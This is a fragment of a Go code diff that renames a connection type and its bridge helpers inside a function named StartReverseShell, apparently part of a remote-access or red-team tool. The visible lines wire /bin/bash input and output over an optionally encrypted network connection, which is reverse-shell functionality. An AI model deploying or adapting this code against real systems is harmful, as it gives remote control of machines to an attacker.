@@ -15,13 +15,13 @@ func StartReverseShell(address, password string) {
 		return
 	}
 
-	var cm comms.ConnectionManager
+	var c comms.Connection
 	if password != "" {
-		cm = comms.NewEncryptedConn(conn, password)
+		c = comms.NewEncryptedConn(conn, password)
 	} else {
-		cm = comms.NewPlainConn(conn)
+		c = comms.NewPlainConn(conn)
 	}
-	defer cm.Close()
+	defer c.Close()
 
 	shellString := "/bin/bash"
 
@@ -47,8 +47,8 @@ func StartReverseShell(address, password string) {
 		return
 	}
 
-	cmdOutErr := comms.BridgeReaderToConnectionManager(cmdOut, cm)
-	cmdInErr := comms.BridgeConnectionManagerToWriter(cm, cmdIn)
+	cmdOutErr := comms.BridgeReaderToConnection(cmdOut, c)
+	cmdInErr := comms.BridgeConnectionToWriter(c, cmdIn)
 
 	err = cmd.Start()
 	if err != nil {
